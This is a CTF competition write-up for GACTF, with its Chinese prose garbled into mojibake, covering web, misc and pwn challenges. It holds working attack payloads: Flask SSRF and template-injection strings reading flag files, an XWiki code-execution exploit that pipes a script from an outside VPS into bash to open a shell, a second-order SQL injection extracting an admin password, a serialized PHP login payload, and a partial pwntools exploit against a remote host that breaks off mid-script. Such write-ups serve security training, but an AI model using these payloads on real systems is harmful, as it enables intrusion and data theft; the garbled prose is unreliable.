# 0RAYS-GACTFçš„writeup
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
æ¯”èµ›å¾ˆä¸é”™ï¼Œåˆè‚äº†ä¸¤å¤©ï¼Œç»ˆäºè‹Ÿä½ç¬¬ä¸ƒåï¼Œå¸ˆå‚…ä»¬å¤ªé¡¶äº†
## WEB
###  EZFLASK
ç¬¬ä¸€éƒ¨åˆ†æºç 
    # -*- coding: utf-8 -*-    from flask import Flask, request
    import requests
    from waf import *
    import time
    app = Flask(__name__)
    @app.route('/ctfhint')
    def ctf():
        hint =xxxx # hints
        trick = xxxx # trick
        return trick
    @app.route('/')
    def index():
        # app.txt
    @app.route('/eval', methods=["POST"])
    def my_eval():
        # post eval
    @app.route(xxxxxx, methods=["POST"]) # Secret
    def admin():
        # admin requests
    if __name__ == '__main__':
        app.run(host='0.0.0.0',port=8080)
åœ¨evalç•Œé¢å¯è¯»å–åˆ°ä¸‹ä¸€æ­¥çš„åœ°å€/h4rdt0f1nd_9792uagcaca00qjaf  
payload:  
`eval=admin.func_globals`
é‡Œé¢æ˜¯ssrfæ‰“å†…ç½‘ï¼Œéœ€è¦è¾“å…¥IPã€ç«¯å£å’Œè·¯å¾„
IPå’Œç«¯å£æ˜¯127.0.1.1 8080 å³æ˜¯å½“å‰é¡µé¢
çˆ†ç ´ç«¯å£å‘ç°å­˜åœ¨5000ç«¯å£ï¼Œè¿™ä¸ªå¯ä»¥è·å¾—flag
    ip=127.0.2.1&port=5000&path=/
ç¬¬äºŒéƒ¨åˆ†æºç 
    import flask
    from xxxx import flag
    app = flask.Flask(__name__)
    app.config['FLAG'] = flag
    @app.route('/')
    def index():
        return open('app.txt').read()
    @app.route('/')
    def hack(hack):
        return flask.render_template_string(hack)
    if __name__ == '__main__':
        app.run(host='0.0.0.0',port=5000)
requsetsæ”¯æŒ302è·³è½¬ï¼Œå¯ä»¥è·³ä¸€ä¸‹ç»•è¿‡å‰é¢çš„é™åˆ¶ï¼Œå°±å¯ä»¥è®¿é—®{{config}}æ‹¿flagäº†  
æœåŠ¡å™¨ä¸Šå†™ä¸ªè·³è½¬åˆ°127.0.2.1ï¼š5000å°±è¡Œ
###  simpleflask
ä¸€å¼€å§‹æ‰«åˆ°äº†/console éœ€è¦PINç  æœ¬æ¥æœ‰ä¸€é¢˜å°±æ˜¯é æ–‡ä»¶è¯»å–ç®—å‡ºPINç çš„ï¼Œæ‰€ä»¥å°±è¢«å¸¦æ­ªäº†
ç®€ç®€å•å•çš„ç»•è¿‡ï¼ŒPayloadå¦‚ä¸‹
    {{session.__init__.__globals__["__bui""ltins__")].open("/fl".__add__("ag")).read()}}
###  XWiki
ç½‘é¡µä¸‹æ–¹å¯è§ç‰ˆæœ¬11.10.1ï¼Œå­˜åœ¨CVE-2020-11057ï¼Œå¯åˆ©ç”¨æ³¨å†Œç”¨æˆ·æƒé™åœ¨ä¸ªäººæ§åˆ¶å°æ‰§è¡Œpythonä»£ç ï¼Œå…·ä½“æ¼æ´åˆ©ç”¨å¯å‚è€ƒä¸‹æ–¹èµ„æ–™
ç”¨ç°æˆpayloadè¯•ä¸€ä¸‹ç¡®è®¤æ¼æ´å­˜åœ¨
    import os
    print(os.popen("id").read())
    print(os.popen("hostname").read())
æ‰§è¡Œlså‘ç°æœ‰/readflagï¼Œå°è¯•ç”¨base64å¸¦å‡ºï¼Œç»“æœä¼šä½¿æ–‡ä»¶æŸå  
åœ¨VPSä¸Šæ”¾ä¸€ä¸ªæ–‡ä»¶ï¼Œåˆ©ç”¨curlæ¥Getshell
    import os
    print(os.popen("curl 47.114.179.29/bash.txt|bash").read())
æœ‰rootæƒé™çš„shellï¼Œä½†æ˜¯ç›´æ¥è¿œç¨‹readflagï¼Œç½‘ç»œæƒ…å†µä»¤äººæ‰æ€¥ï¼Œç›´æ¥cpä¸€ä¸‹readflagåˆ°ä¸€ä¸ªå¯è®¿é—®ç›®å½•ï¼Œç„¶åä¸‹è½½è¿‡æ¥
ä¹‹åæœ¬åœ°è·‘
    from pwn import *
    from Crypto.Util.number import *
    sh = process("./readflag")
    flag=""
    while True:
      try:
        sh.recvuntil("Which number is bigger?  ")
        number1 = sh.recvuntil(":")[:-1]
        number2 = sh.recvuntil("\n")[:-1]
        ans ='0' if int(number1)>int(number2) else '1'
        #print read[25:27],read[30:32],ans
        flag+=ans
        sh.sendline(ans)
    except Exception as e:
      print long_to_bytes(int(flag,2))
      exit()
###  babyshop
å­˜åœ¨.gitæ³„éœ²ï¼Œç›´æ¥ä¸‹è½½æºç 
ä½†æ˜¯è¢«éé¢„æœŸäº†ï¼Œåæ¥é¢˜ç›®æ‰æŠŠè¿™ä¸ªä¿®äº†
ä¸çŸ¥é“è¯´å•¥ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚
###  carefuleyes
æ–‡ä»¶åæ”¹åé‚£é‡ŒäºŒæ¬¡æ³¨å…¥
    -1'union select 1,(select password from `user` where `privilege`='admin'),1,1,'1.jpg
è·‘å‡ºè´¦å·å¯†ç   
XM/qweqweqwe
    //poc.php
    <?php
    require 'common.php';
    $o = new XCTFGG('login',["XM","qweqweqwe"]);
    echo urlencode(serialize($o));
Payload:
    O%3A6%3A%22XCTFGG%22%3A2%3A%7Bs%3A14%3A%22%00XCTFGG%00method%22%3Bs%3A5%3A%22login%22%3Bs%3A12%3A%22%00XCTFGG%00args%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22XM%22%3Bi%3A1%3Bs%3A9%3A%22qweqweqwe%22%3B%7D%7D
## MISC
###  SignIN
æ‰“å¼€ç”»å›¾å¿«ä¹ç­¾åˆ°
## crymisc
docxå…¶å®æ˜¯zipï¼Œä¿®å¤å¤´æ¢å¤å¾—åˆ°å›¾ç‰‡
å›¾ç‰‡å°¾base64å¾—åˆ°å¯†ç 
ä¿®å¤base64å¯†æ–‡åzipå¤´å¾—åˆ°å¦ä¸€ä¸ªåŠ å¯†zipï¼Œæ ¹æ®å¯†ç è§£å¯†å¾—ä¸€å †emojiï¼ŒçŒœæµ‹æ˜¯emojiåŠ å¯†
ğŸ”­ğŸ’™ğŸ°âœŠğŸŒ»ğŸ§ğŸ’™ğŸ˜˜ğŸŒ»ğŸ¶ğŸ’ğŸŒğŸŠğŸ©ğŸšğŸŠğŸ‘¹ğŸ¶ğŸ˜€ğŸ¶ğŸ˜€ğŸ˜˜ğŸ‘¹ğŸ’™ğŸ‚ğŸ’‡ğŸ˜€ğŸ˜€ğŸ˜©ğŸŒ»ğŸŸğŸ‘‚ğŸ¶ğŸ’ğŸŒğŸŠğŸ©ğŸ‘†ğŸ ğŸ™‡ğŸ‚ğŸ‚ğŸ‘¼ğŸ˜±ğŸš”ğŸ¶ğŸ‘‰âœŠğŸ˜±ğŸ ğŸ™‡ğŸ‚ğŸ‚ğŸ‘¼ğŸ˜±ğŸšŠğŸ˜§ğŸ’¨ğŸ’™ğŸ’•
ç½‘ä¸Šæœ‰çˆ†ç ´è„šæœ¬å·²å¾—flagï¼Œemoji keyä¸ºğŸ˜­
`WelcometoGACTF!ThisisthepasswordGACTF{H4ppy_Mi5c_H4ppy_L1fe}`
###  v for Vendetta
ç”±hintå¯çŸ¥å¯†ç ä¸º6ä½æ•° çˆ†ç ´å¾—å¯†ç æ˜¯123233
è§£å‹åè·å¾—ä¸€ä¸ªæ¯”è¾ƒå¤§çš„væ–‡ä»¶ï¼Œçœ‹å¤´æ–‡ä»¶å‘ç°ç¼ºå°‘gifå¤´æ–‡ä»¶ ä¿®å¤åå¾—åˆ°ä¸€ä¸ªçš„gifå›¾ç‰‡ï¼ˆv.gifï¼‰
    # -*- coding: utf-8 -*-    from PIL import Image
    def find_box(im):
        cou = 0
        for j in range(540, 700):
            for k in range(0, 150):
                if im.getpixel((j, k)) == (0, 0, 0):
                    print((j, k))
                    return (j, 0, j + 1, 405)
    imagegif = Image.open(r'D:\Download\20200829GACTF\v\v.gif')
    tempimage = Image.new('RGB', (720, 405), '#000000')
    try:
        for i in range(0, 4000):
            imagegif.seek(i)
            tempimage.paste(imagegif, (0, 0))
            # å› ä¸ºé»‘ç‚¹ä½ç½®å¥½åƒæ²¡å•¥è§„å¾‹ï¼Œå°±ç›´æ¥æš´åŠ›æœå§
            find_box(tempimage)
    except:
        pass
æœ‰äº›è¡Œåˆ—æ²¡æœ‰æ‰¾åˆ°é—®é¢˜ä¹Ÿä¸å¤§ï¼ŒæŠŠè¾“å‡ºå†…å®¹æ”¾æ–‡ä»¶é‡Œ
    # -*- coding: utf-8 -*-    from PIL import Image
    tempimage = Image.new('RGB', (720, 405), '#FFFFFF')
    with open("é»‘ç‚¹å‡ºç°ä½ç½®.txt") as f:
        try:
            while True:
                s=f.readline()
                x=int(s.split(",")[0])
                y=int(s.split(",")[1])
                tempimage.putpixel((x,y),(0,0,0))
        except:
            pass
    tempimage.show()
    tempimage.save("./465464.png")
é™„ä¸Šä¸€ä¸ªä¸€æŠŠæ¢­ç›´æ¥å‡ºäºŒç»´ç å›¾ç‰‡çš„è„šæœ¬
    from PIL import Image
    imgs = []
    for i in range(3583):
        p = Image.open('res/'+str(i)+'.png')
        p = p.crop((550,50,720,140))
        imgs.append(p)
    np = Image.new('L',(200,200),255)
    for tp in imgs:
        a,b = tp.size
        for y in range(b):
            for x in range(a):
                if tp.getpixel((x,y)) == (0,0,0,255):
                    np.putpixel((x,y),0)
    np.save('1.png')
QRsearchæ‰«ï¼Œå±…ç„¶èƒ½æ‰«
    the password is V_f0r_VeNdettA_vk
    now,pwn me to get the flag.
    for China
    119.3.154.59  9999
    for foreign countries
    45.77.72.122 9999
è§£å‹æ–‡ä»¶nwpï¼Œç»“æœæ–‡ä»¶å…¨éƒ¨æ˜¯åè¿‡æ¥çš„  
expå¦‚ä¸‹
    #!/usr/bin/python
    #-*- coding:UTF-8 -*-    from pwn import *
    import sys
    context.log_level = 'debug'
    context.terminal = ['tmux', 'split', '-h']
    context.binary = "./pwn"
    libc = ELF("./libc-2.27.so")
    if sys.argv[1] == "r":
     p = remote("119.3.154.59", 9999)
    elif sys.argv[1] == "l":
     p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./pwn"])
    else:
     p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", "./pwn"])
     raw_input()
    elf = ELF("./pwn")
    p.recvuntil("3: exit\n")
    p.send("1\n")
    p.recvuntil("username:")
    p.send("a"*16)
    p.recvuntil("password:")
    p.send("a"*16)
    p.recvuntil("3: exit\n")
    p.send("2\n")
    p.recvuntil("username:")
    p.send("a"*16)
    p.recvuntil("password:")
    p.send("a"*16)
    p.recvuntil("4:logout\n")